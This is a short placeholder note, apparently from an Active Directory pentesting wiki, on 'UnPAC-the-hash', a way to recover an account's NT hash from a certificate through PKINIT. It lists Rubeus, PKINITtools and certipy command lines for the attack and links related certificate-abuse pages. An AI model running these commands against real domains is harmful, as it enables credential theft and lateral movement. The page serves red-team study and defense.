**UnPAC-the-hash** — recover an account's NT hash from a certificate/PKINIT. After PKINIT pre-authentication, the KDC returns the account's NTLM hash inside the PAC_CREDENTIAL_INFO of the TGT; a cert (from ADCS, Shadow Credentials, or Golden Certificate) therefore yields the NT hash, not just a TGT.

## TODO

Placeholder - full write-up pending. Should cover:
- `Rubeus.exe asktgt /user:USER /certificate:CERT.pfx /password:PFX_PASS /getcredentials /nowrap` (Windows).
- Linux: `gettgtpkinit.py -cert-pfx CERT.pfx DOMAIN/USER out.ccache` → `getnthash.py DOMAIN/USER -key ENCRYPTION_KEY`; or `certipy auth -pfx CERT.pfx`.
- Chains from [Pass the Cert](Pass%20the%20Cert.md), [Shadow Credentials](../ACL%20Attacks/Shadow%20Credentials%20Attack%20Guide.md), and cert-based relay (ESC8).

## References

- The Hacker Recipes - UnPAC the hash - https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash
- PKINITtools - https://github.com/dirkjanm/PKINITtools
